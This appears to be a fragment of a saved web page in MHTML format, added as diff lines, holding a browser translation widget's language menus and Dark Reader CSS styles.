+ value=3D"zh-TW">=E4=B8=AD=E6=96=87(=E7=B9=81=E4=BD=93)</option><option val=
+ue=3D"en">=E8=8B=B1=E8=AF=AD</option><option value=3D"ja">=E6=97=A5=E8=AF=
+=AD</option><option value=3D"ko">=E6=9C=9D=E9=B2=9C=E8=AF=AD</option><optio=
+n value=3D"de">=E5=BE=B7=E8=AF=AD</option><option value=3D"fr">=E6=B3=95=E8=
+=AF=AD</option><option value=3D"ru">=E4=BF=84=E8=AF=AD</option><option valu=
+e=3D"th">=E6=B3=B0=E8=AF=AD</option><option value=3D"af">=E5=8D=97=E9=9D=9E=
+=E8=AF=AD</option><option value=3D"ar">=E9=98=BF=E6=8B=89=E4=BC=AF=E8=AF=AD=
+</option><option value=3D"az">=E9=98=BF=E5=A1=9E=E6=8B=9C=E7=96=86=E8=AF=AD=
+</option><option value=3D"be">=E6=AF=94=E5=88=A9=E6=97=B6=E8=AF=AD</option>=
+<option value=3D"bg">=E4=BF=9D=E5=8A=A0=E5=88=A9=E4=BA=9A=E8=AF=AD</option>=
+<option value=3D"ca">=E5=8A=A0=E6=B3=B0=E9=9A=86=E8=AF=AD</option><option v=
+alue=3D"cs">=E6=8D=B7=E5=85=8B=E8=AF=AD</option><option value=3D"cy">=E5=A8=
+=81=E5=B0=94=E5=A3=AB=E8=AF=AD</option><option value=3D"da">=E4=B8=B9=E9=BA=
+=A6=E8=AF=AD</option><option value=3D"dv">=E7=AC=AC=E7=BB=B4=E5=9F=83=E8=AF=
+=AD</option><option value=3D"el">=E5=B8=8C=E8=85=8A=E8=AF=AD</option><optio=
+n value=3D"eo">=E4=B8=96=E7=95=8C=E8=AF=AD</option><option value=3D"es">=E8=
+=A5=BF=E7=8F=AD=E7=89=99=E8=AF=AD</option><option value=3D"et">=E7=88=B1=E6=
+=B2=99=E5=B0=BC=E4=BA=9A=E8=AF=AD</option><option value=3D"eu">=E5=B7=B4=E5=
+=A3=AB=E5=85=8B=E8=AF=AD</option><option value=3D"fa">=E6=B3=95=E6=96=AF=E8=
+=AF=AD</option><option value=3D"fi">=E8=8A=AC=E5=85=B0=E8=AF=AD</option><op=
+tion value=3D"fo">=E6=B3=95=E7=BD=97=E8=AF=AD</option><option value=3D"gl">=
+=E5=8A=A0=E9=87=8C=E8=A5=BF=E4=BA=9A=E8=AF=AD</option><option value=3D"gu">=
+=E5=8F=A4=E5=90=89=E6=8B=89=E7=89=B9=E8=AF=AD</option><option value=3D"he">=
+=E5=B8=8C=E4=BC=AF=E6=9D=A5=E8=AF=AD</option><option value=3D"hi">=E5=8D=B0=
+=E5=9C=B0=E8=AF=AD</option><option value=3D"hr">=E5=85=8B=E7=BD=97=E5=9C=B0=
+=E4=BA=9A=E8=AF=AD</option><option value=3D"hu">=E5=8C=88=E7=89=99=E5=88=A9=
+=E8=AF=AD</option><option value=3D"hy">=E4=BA=9A=E7=BE=8E=E5=B0=BC=E4=BA=9A=
+=E8=AF=AD</option><option value=3D"id">=E5=8D=B0=E5=BA=A6=E5=B0=BC=E8=A5=BF=
+=E4=BA=9A=E8=AF=AD</option><option value=3D"is">=E5=86=B0=E5=B2=9B=E8=AF=AD=
+</option><option value=3D"it">=E6=84=8F=E5=A4=A7=E5=88=A9=E8=AF=AD</option>=
+<option value=3D"ka">=E6=A0=BC=E9=B2=81=E5=90=89=E4=BA=9A=E8=AF=AD</option>=
+<option value=3D"kk">=E5=93=88=E8=90=A8=E5=85=8B=E8=AF=AD</option><option v=
+alue=3D"kn">=E5=8D=A1=E7=BA=B3=E6=8B=89=E8=AF=AD</option><option value=3D"k=
+ok">=E5=AD=94=E5=8D=A1=E5=B0=BC=E8=AF=AD</option><option value=3D"ky">=E5=
+=90=89=E5=B0=94=E5=90=89=E6=96=AF=E8=AF=AD</option><option value=3D"lt">=E7=
+=AB=8B=E9=99=B6=E5=AE=9B=E8=AF=AD</option><option value=3D"lv">=E6=8B=89=E8=
+=84=B1=E7=BB=B4=E4=BA=9A=E8=AF=AD</option><option value=3D"mi">=E6=AF=9B=E5=
+=88=A9=E8=AF=AD</option><option value=3D"mk">=E9=A9=AC=E5=85=B6=E9=A1=BF=E8=
+=AF=AD</option><option value=3D"mn">=E8=92=99=E5=8F=A4=E8=AF=AD</option><op=
+tion value=3D"mr">=E9=A9=AC=E6=8B=89=E5=9C=B0=E8=AF=AD</option><option valu=
+e=3D"ms">=E9=A9=AC=E6=9D=A5=E8=AF=AD</option><option value=3D"mt">=E9=A9=AC=
+=E8=80=B3=E4=BB=96=E8=AF=AD</option><option value=3D"nb">=E6=8C=AA=E5=A8=81=
+=E8=AF=AD(=E4=BC=AF=E5=85=8B=E6=A2=85=E5=B0=94)</option><option value=3D"nl=
+">=E8=8D=B7=E5=85=B0=E8=AF=AD</option><option value=3D"ns">=E5=8C=97=E6=A2=
+=AD=E6=89=98=E8=AF=AD</option><option value=3D"pa">=E6=97=81=E9=81=AE=E6=99=
+=AE=E8=AF=AD</option><option value=3D"pl">=E6=B3=A2=E5=85=B0=E8=AF=AD</opti=
+on><option value=3D"pt">=E8=91=A1=E8=90=84=E7=89=99=E8=AF=AD</option><optio=
+n value=3D"qu">=E5=85=8B=E4=B8=98=E4=BA=9A=E8=AF=AD</option><option value=
+=3D"ro">=E7=BD=97=E9=A9=AC=E5=B0=BC=E4=BA=9A=E8=AF=AD</option><option value=
+=3D"sa">=E6=A2=B5=E6=96=87</option><option value=3D"se">=E5=8C=97=E8=90=A8=
+=E6=91=A9=E6=96=AF=E8=AF=AD</option><option value=3D"sk">=E6=96=AF=E6=B4=9B=
+=E4=BC=90=E5=85=8B=E8=AF=AD</option><option value=3D"sl">=E6=96=AF=E6=B4=9B=
+=E6=96=87=E5=B0=BC=E4=BA=9A=E8=AF=AD</option><option value=3D"sq">=E9=98=BF=
+=E5=B0=94=E5=B7=B4=E5=B0=BC=E4=BA=9A=E8=AF=AD</option><option value=3D"sv">=
+=E7=91=9E=E5=85=B8=E8=AF=AD</option><option value=3D"sw">=E6=96=AF=E7=93=A6=
+=E5=B8=8C=E9=87=8C=E8=AF=AD</option><option value=3D"syr">=E5=8F=99=E5=88=
+=A9=E4=BA=9A=E8=AF=AD</option><option value=3D"ta">=E6=B3=B0=E7=B1=B3=E5=B0=
+=94=E8=AF=AD</option><option value=3D"te">=E6=B3=B0=E5=8D=A2=E5=9B=BA=E8=AF=
+=AD</option><option value=3D"tl">=E5=A1=94=E5=8A=A0=E8=B7=AF=E8=AF=AD</opti=
+on><option value=3D"tn">=E8=8C=A8=E7=93=A6=E7=BA=B3=E8=AF=AD</option><optio=
+n value=3D"tr">=E5=9C=9F=E8=80=B3=E5=85=B6=E8=AF=AD</option><option value=
+=3D"ts">=E5=AE=97=E5=8A=A0=E8=AF=AD</option><option value=3D"tt">=E9=9E=91=
+=E9=9D=BC=E8=AF=AD</option><option value=3D"uk">=E4=B9=8C=E5=85=8B=E5=85=B0=
+=E8=AF=AD</option><option value=3D"ur">=E4=B9=8C=E9=83=BD=E8=AF=AD</option>=
+<option value=3D"uz">=E4=B9=8C=E5=85=B9=E5=88=AB=E5=85=8B=E8=AF=AD</option>=
+<option value=3D"vi">=E8=B6=8A=E5=8D=97=E8=AF=AD</option><option value=3D"x=
+h">=E7=8F=AD=E5=9B=BE=E8=AF=AD</option><option value=3D"zu">=E7=A5=96=E9=B2=
+=81=E8=AF=AD</option> </select> <st-div class=3D"__exchange__"> <st-span cl=
+ass=3D"st-icon-exchange"></st-span> </st-div> <select> <option value=3D"">=
+=E8=87=AA=E5=8A=A8=E9=80=89=E6=8B=A9</option> <option value=3D"zh">=E4=B8=
+=AD=E6=96=87</option><option value=3D"zh-CN">=E4=B8=AD=E6=96=87(=E7=AE=80=
+=E4=BD=93)</option><option value=3D"zh-HK">=E4=B8=AD=E6=96=87(=E9=A6=99=E6=
+=B8=AF)</option><option value=3D"zh-TW">=E4=B8=AD=E6=96=87(=E7=B9=81=E4=BD=
+=93)</option><option value=3D"en">=E8=8B=B1=E8=AF=AD</option><option value=
+=3D"ja">=E6=97=A5=E8=AF=AD</option><option value=3D"ko">=E6=9C=9D=E9=B2=9C=
+=E8=AF=AD</option><option value=3D"de">=E5=BE=B7=E8=AF=AD</option><option v=
+alue=3D"fr">=E6=B3=95=E8=AF=AD</option><option value=3D"ru">=E4=BF=84=E8=AF=
+=AD</option><option value=3D"th">=E6=B3=B0=E8=AF=AD</option><option value=
+=3D"af">=E5=8D=97=E9=9D=9E=E8=AF=AD</option><option value=3D"ar">=E9=98=BF=
+=E6=8B=89=E4=BC=AF=E8=AF=AD</option><option value=3D"az">=E9=98=BF=E5=A1=9E=
+=E6=8B=9C=E7=96=86=E8=AF=AD</option><option value=3D"be">=E6=AF=94=E5=88=A9=
+=E6=97=B6=E8=AF=AD</option><option value=3D"bg">=E4=BF=9D=E5=8A=A0=E5=88=A9=
+=E4=BA=9A=E8=AF=AD</option><option value=3D"ca">=E5=8A=A0=E6=B3=B0=E9=9A=86=
+=E8=AF=AD</option><option value=3D"cs">=E6=8D=B7=E5=85=8B=E8=AF=AD</option>=
+<option value=3D"cy">=E5=A8=81=E5=B0=94=E5=A3=AB=E8=AF=AD</option><option v=
+alue=3D"da">=E4=B8=B9=E9=BA=A6=E8=AF=AD</option><option value=3D"dv">=E7=AC=
+=AC=E7=BB=B4=E5=9F=83=E8=AF=AD</option><option value=3D"el">=E5=B8=8C=E8=85=
+=8A=E8=AF=AD</option><option value=3D"eo">=E4=B8=96=E7=95=8C=E8=AF=AD</opti=
+on><option value=3D"es">=E8=A5=BF=E7=8F=AD=E7=89=99=E8=AF=AD</option><optio=
+n value=3D"et">=E7=88=B1=E6=B2=99=E5=B0=BC=E4=BA=9A=E8=AF=AD</option><optio=
+n value=3D"eu">=E5=B7=B4=E5=A3=AB=E5=85=8B=E8=AF=AD</option><option value=
+=3D"fa">=E6=B3=95=E6=96=AF=E8=AF=AD</option><option value=3D"fi">=E8=8A=AC=
+=E5=85=B0=E8=AF=AD</option><option value=3D"fo">=E6=B3=95=E7=BD=97=E8=AF=AD=
+</option><option value=3D"gl">=E5=8A=A0=E9=87=8C=E8=A5=BF=E4=BA=9A=E8=AF=AD=
+</option><option value=3D"gu">=E5=8F=A4=E5=90=89=E6=8B=89=E7=89=B9=E8=AF=AD=
+</option><option value=3D"he">=E5=B8=8C=E4=BC=AF=E6=9D=A5=E8=AF=AD</option>=
+<option value=3D"hi">=E5=8D=B0=E5=9C=B0=E8=AF=AD</option><option value=3D"h=
+r">=E5=85=8B=E7=BD=97=E5=9C=B0=E4=BA=9A=E8=AF=AD</option><option value=3D"h=
+u">=E5=8C=88=E7=89=99=E5=88=A9=E8=AF=AD</option><option value=3D"hy">=E4=BA=
+=9A=E7=BE=8E=E5=B0=BC=E4=BA=9A=E8=AF=AD</option><option value=3D"id">=E5=8D=
+=B0=E5=BA=A6=E5=B0=BC=E8=A5=BF=E4=BA=9A=E8=AF=AD</option><option value=3D"i=
+s">=E5=86=B0=E5=B2=9B=E8=AF=AD</option><option value=3D"it">=E6=84=8F=E5=A4=
+=A7=E5=88=A9=E8=AF=AD</option><option value=3D"ka">=E6=A0=BC=E9=B2=81=E5=90=
+=89=E4=BA=9A=E8=AF=AD</option><option value=3D"kk">=E5=93=88=E8=90=A8=E5=85=
+=8B=E8=AF=AD</option><option value=3D"kn">=E5=8D=A1=E7=BA=B3=E6=8B=89=E8=AF=
+=AD</option><option value=3D"kok">=E5=AD=94=E5=8D=A1=E5=B0=BC=E8=AF=AD</opt=
+ion><option value=3D"ky">=E5=90=89=E5=B0=94=E5=90=89=E6=96=AF=E8=AF=AD</opt=
+ion><option value=3D"lt">=E7=AB=8B=E9=99=B6=E5=AE=9B=E8=AF=AD</option><opti=
+on value=3D"lv">=E6=8B=89=E8=84=B1=E7=BB=B4=E4=BA=9A=E8=AF=AD</option><opti=
+on value=3D"mi">=E6=AF=9B=E5=88=A9=E8=AF=AD</option><option value=3D"mk">=
+=E9=A9=AC=E5=85=B6=E9=A1=BF=E8=AF=AD</option><option value=3D"mn">=E8=92=99=
+=E5=8F=A4=E8=AF=AD</option><option value=3D"mr">=E9=A9=AC=E6=8B=89=E5=9C=B0=
+=E8=AF=AD</option><option value=3D"ms">=E9=A9=AC=E6=9D=A5=E8=AF=AD</option>=
+<option value=3D"mt">=E9=A9=AC=E8=80=B3=E4=BB=96=E8=AF=AD</option><option v=
+alue=3D"nb">=E6=8C=AA=E5=A8=81=E8=AF=AD(=E4=BC=AF=E5=85=8B=E6=A2=85=E5=B0=
+=94)</option><option value=3D"nl">=E8=8D=B7=E5=85=B0=E8=AF=AD</option><opti=
+on value=3D"ns">=E5=8C=97=E6=A2=AD=E6=89=98=E8=AF=AD</option><option value=
+=3D"pa">=E6=97=81=E9=81=AE=E6=99=AE=E8=AF=AD</option><option value=3D"pl">=
+=E6=B3=A2=E5=85=B0=E8=AF=AD</option><option value=3D"pt">=E8=91=A1=E8=90=84=
+=E7=89=99=E8=AF=AD</option><option value=3D"qu">=E5=85=8B=E4=B8=98=E4=BA=9A=
+=E8=AF=AD</option><option value=3D"ro">=E7=BD=97=E9=A9=AC=E5=B0=BC=E4=BA=9A=
+=E8=AF=AD</option><option value=3D"sa">=E6=A2=B5=E6=96=87</option><option v=
+alue=3D"se">=E5=8C=97=E8=90=A8=E6=91=A9=E6=96=AF=E8=AF=AD</option><option v=
+alue=3D"sk">=E6=96=AF=E6=B4=9B=E4=BC=90=E5=85=8B=E8=AF=AD</option><option v=
+alue=3D"sl">=E6=96=AF=E6=B4=9B=E6=96=87=E5=B0=BC=E4=BA=9A=E8=AF=AD</option>=
+<option value=3D"sq">=E9=98=BF=E5=B0=94=E5=B7=B4=E5=B0=BC=E4=BA=9A=E8=AF=AD=
+</option><option value=3D"sv">=E7=91=9E=E5=85=B8=E8=AF=AD</option><option v=
+alue=3D"sw">=E6=96=AF=E7=93=A6=E5=B8=8C=E9=87=8C=E8=AF=AD</option><option v=
+alue=3D"syr">=E5=8F=99=E5=88=A9=E4=BA=9A=E8=AF=AD</option><option value=3D"=
+ta">=E6=B3=B0=E7=B1=B3=E5=B0=94=E8=AF=AD</option><option value=3D"te">=E6=
+=B3=B0=E5=8D=A2=E5=9B=BA=E8=AF=AD</option><option value=3D"tl">=E5=A1=94=E5=
+=8A=A0=E8=B7=AF=E8=AF=AD</option><option value=3D"tn">=E8=8C=A8=E7=93=A6=E7=
+=BA=B3=E8=AF=AD</option><option value=3D"tr">=E5=9C=9F=E8=80=B3=E5=85=B6=E8=
+=AF=AD</option><option value=3D"ts">=E5=AE=97=E5=8A=A0=E8=AF=AD</option><op=
+tion value=3D"tt">=E9=9E=91=E9=9D=BC=E8=AF=AD</option><option value=3D"uk">=
+=E4=B9=8C=E5=85=8B=E5=85=B0=E8=AF=AD</option><option value=3D"ur">=E4=B9=8C=
+=E9=83=BD=E8=AF=AD</option><option value=3D"uz">=E4=B9=8C=E5=85=B9=E5=88=AB=
+=E5=85=8B=E8=AF=AD</option><option value=3D"vi">=E8=B6=8A=E5=8D=97=E8=AF=AD=
+</option><option value=3D"xh">=E7=8F=AD=E5=9B=BE=E8=AF=AD</option><option v=
+alue=3D"zu">=E7=A5=96=E9=B2=81=E8=AF=AD</option> </select> </st-div> <st-di=
+v> <select> <option value=3D"YouDao">=E6=9C=89=E9=81=93=E7=BF=BB=E8=AF=91</=
+option> <option value=3D"BaiDu">=E7=99=BE=E5=BA=A6=E7=BF=BB=E8=AF=91</optio=
+n> <option value=3D"Google">=E8=B0=B7=E6=AD=8C=E7=BF=BB=E8=AF=91</option> <=
+option value=3D"GoogleCN">=E8=B0=B7=E6=AD=8C=E7=BF=BB=E8=AF=91=EF=BC=88=E5=
+=9B=BD=E5=86=85=EF=BC=89</option> </select> <st-div class=3D"__action-list_=
+_"> <st-div class=3D"__button__ __btn-translate__">=E7=BF=BB=E8=AF=91 <st-s=
+pan class=3D"st-icon-down-dir"></st-span> </st-div> <st-div class=3D"__expa=
+nd__"> <st-div class=3D"__button__">=E6=9C=97=E8=AF=BB</st-div> <st-div cla=
+ss=3D"__button__">=E5=A4=8D=E5=88=B6</st-div> </st-div> </st-div> </st-div>=
+ </st-div> <st-div class=3D"__translate-result__" style=3D"display: none;">=
+=E6=AD=A3=E5=9C=A8=E6=9F=A5=E8=AF=A2=EF=BC=8C=E8=AF=B7=E7=A8=8D=E5=80=99=E2=
+=80=A6=E2=80=A6</st-div> <st-div class=3D"__translate-result__"> <st-div st=
+yle=3D"display: none;"> <st-span></st-span> <st-span class=3D"__retry__">=
+=E9=87=8D=E8=AF=95</st-span> </st-div> <st-div> <st-div class=3D"__phonetic=
+__"> <st-span style=3D"display: none;"></st-span> <st-span class=3D"__copy-=
+and-read__"> <st-span>=E6=9C=97=E8=AF=BB</st-span> <st-span style=3D"displa=
+y: none;">=E5=A4=8D=E5=88=B6</st-span> </st-span> </st-div> <st-div style=
+=3D"display: none;"> <st-ul>  </st-ul> <st-div class=3D"__copy-and-read__">=
+ <st-span class=3D"__copy-and-read__">=E5=A4=8D=E5=88=B6</st-span> </st-div=
+> </st-div> <st-div style=3D"display: none;">  <st-div class=3D"__copy-and-=
+read__"> <st-span class=3D"__copy-and-read__">=E6=9C=97=E8=AF=BB</st-span> =
+<st-span class=3D"__copy-and-read__">=E5=A4=8D=E5=88=B6</st-span> </st-div>=
+ </st-div> </st-div> </st-div> <st-footer> <st-span style=3D"">via <a targe=
+t=3D"_blank" href=3D"https://www.ifmicro.com/%E8%AE%B0%E5%BD%95/2017/12/12/=
+netcat-usage/">=E8=B0=B7=E6=AD=8C=E7=BF=BB=E8=AF=91=EF=BC=88=E5=9B=BD=E5=86=
+=85=EF=BC=89</a></st-span> </st-footer> </st-div> <st-div class=3D"__st-btn=
+__" style=3D"display: none; position: fixed; z-index: 99999; left: 0px; top=
+: 0px; transform: translateX(0px) translateY(0px);">=E8=AF=91</st-div> </st=
+-div><div class=3D"goog-te-spinner-pos"><div class=3D"goog-te-spinner-anima=
+tion"><svg xmlns=3D"http://www.w3.org/2000/svg" class=3D"goog-te-spinner" w=
+idth=3D"96px" height=3D"96px" viewBox=3D"0 0 66 66"><circle class=3D"goog-t=
+e-spinner-path" fill=3D"none" stroke-width=3D"6" stroke-linecap=3D"round" c=
+x=3D"33" cy=3D"33" r=3D"30" data-darkreader-inline-fill=3D"" style=3D"--dar=
+kreader-inline-fill:none;"></circle></svg></div></div></body><div style=3D"=
+width: 32px !important; height: 32px !important; display: none; background:=
+ rgb(255, 255, 255) !important; border-radius: 16px !important; box-shadow:=
+ rgb(136, 136, 136) 4px 4px 8px !important; position: absolute !important; =
+z-index: 2147483647 !important; --darkreader-inline-bgimage: initial; --dar=
+kreader-inline-bgcolor:#bcbab6; --darkreader-inline-boxshadow:#6f6d68 4px 4=
+px 8px; top: 6095px; left: 267px;" data-darkreader-inline-bgimage=3D"" data=
+-darkreader-inline-bgcolor=3D"" data-darkreader-inline-boxshadow=3D""><svg =
+href=3D"javascript:void(0)" style=3D"width:24px;height:24px;margin:4px!impo=
+rtant;" "width=3D"24" height=3D"24" viewBox=3D"0 0 768 768"><path d=3D"M672=
+ 640.5v-417c0-18-13.5-31.5-31.5-31.5h-282l37.5 129h61.5v-33h34.5v33h115.5v3=
+3h-40.5c-10.5 40.5-33 79.5-61.5 112.5l87 85.5-22.5 24-87-85.5-28.5 28.5 25.=
+5 88.5-64.5 64.5h225c18 0 31.5-13.5 31.5-31.5zM447 388.5c7.5 15 19.5 34.5 3=
+6 54 39-46.5 49.5-88.5 49.5-88.5h-127.5l10.5 34.5h31.5zM423 412.5l19.5 70.5=
+ 18-16.5c-15-16.5-27-34.5-37.5-54zM355.5 339c0-7.381-0.211-16.921-3-22.5h-1=
+26v49.5h70.5c-4.5 19.5-24 48-67.5 48-42 0-76.5-36-76.5-78s34.5-78 76.5-78c2=
+4 0 39 10.5 48 19.5l3 1.5 39-37.5-3-1.5c-24-22.5-54-34.5-87-34.5-72 0-130.5=
+ 58.5-130.5 130.5s58.5 130.5 130.5 130.5c73.5 0 126-52.5 126-127.5zM640.5 1=
+60.5c34.5 0 63 28.5 63 63v417c0 34.5-28.5 63-63 63h-256.5l-31.5-96h-225c-34=
+.5 0-63-28.5-63-63v-417c0-34.5 28.5-63 63-63h192l28.5 96h292.5z" style=3D"f=
+ill: rgb(62, 132, 244); --darkreader-inline-fill:#2b65c2;" data-darkreader-=
+inline-fill=3D""></path></svg></div></html>
+------MultipartBoundary--cMcMRR2qLVMG9r5frlSI25A3ondTpnTpM8CpkvI0yM----
+Content-Type: text/css
+Content-Transfer-Encoding: quoted-printable
+Content-Location: cid:css-43ee7e75-3a9a-45d5-a372-d6f604c51cff@mhtml.blink
+
+@charset "utf-8";
+=0A
+------MultipartBoundary--cMcMRR2qLVMG9r5frlSI25A3ondTpnTpM8CpkvI0yM----
+Content-Type: text/css
+Content-Transfer-Encoding: quoted-printable
+Content-Location: cid:css-abfe4200-8acd-4e2a-8ecb-11415219707d@mhtml.blink
+
+@charset "utf-8";
+=0A
+------MultipartBoundary--cMcMRR2qLVMG9r5frlSI25A3ondTpnTpM8CpkvI0yM----
+Content-Type: text/css
+Content-Transfer-Encoding: quoted-printable
+Content-Location: cid:css-f1781fcc-802b-44a3-88dc-68b1e5beec35@mhtml.blink
+
+@charset "utf-8";
+
+.jfk-bubble, embed[type=3D"application/pdf"] { filter: brightness(85%) cont=
+rast(85%) !important; }
+------MultipartBoundary--cMcMRR2qLVMG9r5frlSI25A3ondTpnTpM8CpkvI0yM----
+Content-Type: text/css
+Content-Transfer-Encoding: quoted-printable
+Content-Location: cid:css-27fd9829-12a6-4b2b-9d20-6a45b1a191ba@mhtml.blink
+
+@charset "utf-8";
+
+[data-darkreader-inline-bgcolor] { background-color: var(--darkreader-inlin=
+e-bgcolor)  !important; }
+
+[data-darkreader-inline-bgimage] { background-image: var(--darkreader-inlin=
+e-bgimage)  !important; }
+
+[data-darkreader-inline-border] { border-color: var(--darkreader-inline-bor=
+der)  !important; }
+
+[data-darkreader-inline-border-bottom] { border-bottom-color: var(--darkrea=
+der-inline-border-bottom)  !important; }
+
+[data-darkreader-inline-border-left] { border-left-color: var(--darkreader-=
+inline-border-left)  !important; }
+
+[data-darkreader-inline-border-right] { border-right-color: var(--darkreade=
+r-inline-border-right)  !important; }
+
+[data-darkreader-inline-border-top] { border-top-color: var(--darkreader-in=
+line-border-top)  !important; }
+
+[data-darkreader-inline-boxshadow] { box-shadow: var(--darkreader-inline-bo=
+xshadow)  !important; }
+
+[data-darkreader-inline-color] { color: var(--darkreader-inline-color)  !im=
+portant; }
+
+[data-darkreader-inline-fill] { fill: var(--darkreader-inline-fill)  !impor=
+tant; }
+
+[data-darkreader-inline-stroke] { stroke: var(--darkreader-inline-stroke)  =
+!important; }
+
+[data-darkreader-inline-outline] { outline-color: var(--darkreader-inline-o=
+utline)  !important; }
+------MultipartBoundary--cMcMRR2qLVMG9r5frlSI25A3ondTpnTpM8CpkvI0yM----
+Content-Type: text/css
+Content-Transfer-Encoding: quoted-printable
+Content-Location: cid:css-3a31fc56-9a43-4d2e-9d8d-ead902d5d3f3@mhtml.blink
+
+@charset "utf-8";
+
+html { background-color: rgb(188, 186, 182) !important; }
+
+html, body, input, textarea, select, button { background-color: rgb(188, 18=
+6, 182); }
+
+html, body, input, textarea, select, button { border-color: rgb(67, 69, 70)=
+; color: rgb(19, 19, 19); }
+
+a { color: rgb(19, 61, 185); }
+
+table { border-color: rgb(104, 103, 100); }
+
+::placeholder { color: rgb(134, 131, 124); }
+
+input:-webkit-autofill, textarea:-webkit-autofill, select:-webkit-autofill =
+{ background-color: rgb(169, 165, 159) !important; color: rgb(19, 19, 19) !=
+important; }
+
+::-webkit-scrollbar { background-color: rgb(180, 177, 172); color: rgb(81, =
+82, 82); }
+
+::-webkit-scrollbar-thumb { background-color: rgb(139, 135, 128); }
+
+::-webkit-scrollbar-thumb:hover { background-color: rgb(117, 114, 109); }
+
+::-webkit-scrollbar-thumb:active { background-color: rgb(81, 82, 82); }
+
+::-webkit-scrollbar-corner { background-color: rgb(188, 186, 182); }
+
+* { }
+
+::selection { background-color: rgb(19, 81, 157) !important; color: rgb(188=
+, 186, 182) !important; }
+------MultipartBoundary--cMcMRR2qLVMG9r5frlSI25A3ondTpnTpM8CpkvI0yM----
+Content-Type: text/css
+Content-Transfer-Encoding: quoted-printable
+Content-Location: cid:css-6ef79796-27c3-4d99-abae-9a15b8340cc3@mhtml.blink
+
+@charset "utf-8";
+
+a { background-color: transparent; }
+
+a:active, a:hover { outline-color: initial; }
+
+abbr[title] { border-bottom-color: initial; }
+
+mark { background-image: initial; background-color: rgb(185, 185, 19); colo=
+r: rgb(19, 19, 19); }
+
+img { border-color: initial; }
+
+button, input, optgroup, select, textarea { color: inherit; }
+
+fieldset { border-color: rgb(150, 146, 138); }
+
+legend { border-color: initial; }
+
+body { color: rgb(176, 173, 167); background-image: initial; background-col=
+or: rgb(19, 19, 19); }
+
+.site-header { background-image: initial; background-color: rgb(36, 39, 41)=
+; }
+
+.site-title, .site-title:visited { color: rgb(19, 159, 185); }
+
+.site-title:hover { color: rgba(19, 159, 185, 0.39); }
+
+@media (max-width: 767px) {
+  .site-nav-toggle { background-image: none; background-color: initial; bor=
+der-color: initial; }
+  .site-nav-toggle span { background-image: initial; background-color: rgb(=
+188, 186, 182); }
+}
+
+.site-nav .page-link, .site-nav .page-link:visited { color: rgb(185, 185, 1=
+9); }
+
+.site-nav .page-link:hover { color: rgba(185, 185, 19, 0.39); }
+
+.site-nav .page-link.active { background-image: initial; background-color: =
+rgb(60, 63, 65); }
+
+.site-footer .site-wrapper { border-color: rgba(185, 19, 71, 0.42); backgro=
+und-image: initial; background-color: rgba(185, 19, 71, 0.15); }
+
+.site-footer .site-wrapper p a { text-decoration-color: initial; }
+
+.site-footer .site-wrapper p a:hover { text-decoration-color: initial; }
+
+a { text-decoration-color: initial; }
+
+h1 { color: rgb(203, 34, 91); }
+
+h2 { color: rgb(203, 174, 56); }
+
+h3 { color: rgb(174, 203, 56); }
+
+h4 { color: rgb(74, 174, 117); }
+
+h5 { color: rgb(185, 19, 19); }
+
+h6 { color: rgb(19, 185, 185); }
+
+a { text-decoration-color: initial; }
+
+a, a:visited { color: rgb(68, 130, 182); }
+
+a:hover { color: rgb(37, 137, 37); }
+
+img { border-color: initial; }
+
+code { color: rgb(158, 154, 146); }
+
+pre { background-image: initial; background-color: rgba(26, 105, 81, 0.26);=
+ border-color: rgba(29, 109, 101, 0.2); }
+
+pre:hover { border-color: rgb(29, 109, 101); }
+
+blockquote { border-top-color: rgba(49, 53, 55, 0.5); border-bottom-color: =
+rgba(49, 53, 55, 0.5); border-left-color: rgb(49, 53, 55); border-right-col=
+or: initial; background-image: initial; background-color: rgba(49, 53, 55, =
+0.5); }
+
+th, td { border-color: rgb(42, 75, 86); }
+
+hr { border-right-color: initial; border-bottom-color: initial; border-left=
+-color: initial; border-top-color: rgb(44, 47, 49); }
+
+del { text-decoration-color: initial; }
+
+strong, b { color: rgba(29, 166, 29, 0.88); }
+
+em, i { color: rgb(185, 85, 37); }
+
+.article-header div { color: rgb(188, 186, 182); }
+
+.article-header div span { color: rgb(149, 144, 82); }
+
+.micro-say pre { border-color: rgb(152, 42, 86); background-color: rgba(93,=
+ 19, 102, 0); }
+
+.micro-say pre code { color: rgb(19, 102, 19); }
+
+.micro-say pre:hover { background-color: rgba(93, 19, 102, 0); }
+
+.pagination ul { list-style-image: initial; }
+
+.tocWrap .menu { background-color: rgb(184, 154, 30); color: rgb(34, 36, 38=
+); }
+
+.tocWrap #markdown-toc { border-color: rgb(184, 154, 30); color: rgb(123, 1=
+20, 114); background-image: initial; background-color: rgba(34, 36, 37, 0.8=
+5); box-shadow: rgb(19, 19, 19) 0px 1px 8px; }
+
+.post-category { border-color: rgb(35, 63, 81); background-color: rgb(35, 6=
+3, 81); }
+
+.post-category:hover { border-color: rgb(73, 74, 75); background-color: rgb=
+(73, 74, 75); }
+
+.back-to-top { background-image: initial; background-color: rgb(36, 39, 41)=
+; }
+
+.back-to-top span { background-image: initial; background-color: rgb(19, 15=
+9, 185); }
+
+.sidebar-toggle { background-image: initial; background-color: rgb(36, 39, =
+41); }
+
+.sidebar-toggle .sidebar-toggle-line { background-image: initial; backgroun=
+d-color: rgb(19, 159, 185); }
+
+.sidebar { box-shadow: rgb(19, 19, 19) 0px 2px 6px inset; background-image:=
+ initial; background-color: rgb(39, 42, 44); }
+
+.sidebar a { color: rgb(123, 120, 114); border-bottom-color: rgb(73, 75, 76=
+); }
+
+.sidebar a:hover { color: rgb(178, 175, 169); }
+
+.sidebar-inner { color: rgb(123, 120, 114); }
+
+.sidebar-inner li { border-bottom-color: transparent; color: rgb(73, 75, 76=
+); }
+
+.sidebar-inner .sidebar-active { color: rgb(88, 168, 203); border-bottom-co=
+lor: rgb(88, 168, 203); }
+
+.sidebar-panel .sidebar-nav a.active { color: rgb(19, 159, 185); background=
+-image: initial; background-color: rgb(53, 56, 58); }
+
+#markdown-toc .active > a { color: rgb(88, 168, 203); border-bottom-color: =
+rgb(88, 168, 203); }
+
+.tag_box { list-style-image: initial; }
+
+.tag_box .tag-name-selected a { background-color: rgb(19, 102, 102); }
+
+.tag_box li a { color: rgb(19, 185, 185); text-decoration-color: initial; }
+
+.highlight .c, .highlight .cd { color: rgb(93, 92, 91); }
+
+.highlight .cm { color: rgb(93, 92, 91); }
+
+.highlight .c1 { color: rgb(93, 92, 91); }
+
+.highlight .cp { color: rgb(68, 70, 72); }
+
+.highlight .cs { color: rgb(68, 70, 72); }
+
+.highlight .err { color: rgb(182, 180, 174); background-color: rgb(57, 60, =
+62); }
+
